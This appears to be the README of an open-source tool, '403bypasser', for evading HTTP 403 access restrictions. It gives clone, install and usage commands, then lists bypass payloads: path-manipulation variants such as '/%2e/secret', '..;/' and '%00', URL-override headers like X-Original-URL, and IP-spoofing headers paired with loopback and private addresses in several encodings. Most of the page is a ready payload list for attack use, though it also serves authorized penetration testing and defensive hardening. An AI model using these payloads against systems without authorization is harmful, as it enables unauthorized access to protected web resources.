# 403-Bypass technique


## Installation

1. Clone the repository to your machine. `git clone https://github.com/yunemse48/403bypasser.git`
2. Install required modules by running the code `pip install -r requirements.txt`
3. READY!



| Argument | Description | Examples | Note |
| -------- | ----------- | ------- | ---- |
| -u | single URL to scan | http://example.com or http://example.com/ | All these example usages are interpreted in the same way |
| -U | path to list of URLs | ./urllist.txt, ../../urllist.txt, etc.  | Just provide the path where the file is located :) |
| -d | single directory to scan | admin or /admin or admin/ or /admin/ | All these example usages are interpreted in the same way |
| -D | path to list of directories | ./dirlist.txt, ../../dirlist.txt, etc.  | Just provide the path where the file is located :) |

**Usage 1:** `python3 403bypasser.py -u https://example.com -d /secret`<br>
**Usage 2:** `python3 403bypasser.py -u https://example.com -D dirlist.txt`<br>
**Usage 3:** `python3 403bypasser.py -U urllist.txt -d /secret`<br>
**Usage 4:** `python3 403bypasser.py -U urllist.txt -D dirlist.txt`<br>


### 2. Path Manipulation
- `/%2e/secret`
- `/secret/`
- `/secret..;/` 
- `/secret/..;/`
- `/secret%20`  
- `/secret%09`
- `/secret%00`
- `/secret.json`
- `/secret.css`
- `/secret.html`
- `/secret?`
- `/secret??`
- `/secret???`
- `/secret?testparam`
- `/secret#`
- `/secret#test`
- `/secret/.`
- `//secret//`
- `/./secret/./`

### 3. Overriding the Target URL via Non-Standard Headers
- `X-Original-URL: /secret`
- `X-Rewrite-URL: /secret`

### 4. Other Headers & Values 
**Headers:** 
- `X-Custom-IP-Authorization`
- `X-Forwarded-For`
- `X-Forward-For`
- `X-Remote-IP`
- `X-Originating-IP`
- `X-Remote-Addr`
- `X-Client-IP`
- `X-Real-IP`

**Values:**
- `localhost`
- `localhost:80`
- `localhost:443`
- `127.0.0.1`
- `127.0.0.1:80`
- `127.0.0.1:443`
- `2130706433`
- `0x7F000001`
- `0177.0000.0000.0001`
- `0`
- `127.1`
- `10.0.0.0`
- `10.0.0.1`
- `172.16.0.0`
- `172.16.0.1`
- `192.168.1.0`
- `192.168.1.1`

